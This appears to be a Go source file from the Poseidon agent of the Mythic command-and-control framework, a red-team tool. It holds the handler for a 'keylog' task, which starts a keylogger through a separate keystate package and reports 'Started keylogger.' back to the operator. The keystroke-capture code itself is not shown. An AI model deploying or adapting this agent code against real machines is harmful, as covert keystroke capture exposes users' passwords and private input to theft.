package keylog

import (
	// Standard

	"fmt"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog/keystate"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - Function that executes the shell command
func Run(task structs.Task) {

	msg := task.NewResponse()

	err := keystate.StartKeylogger(task)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}
	msg.Completed = false
	msg.UserOutput = fmt.Sprintf("Started keylogger.")
	task.Job.SendResponses <- msg
	return
}
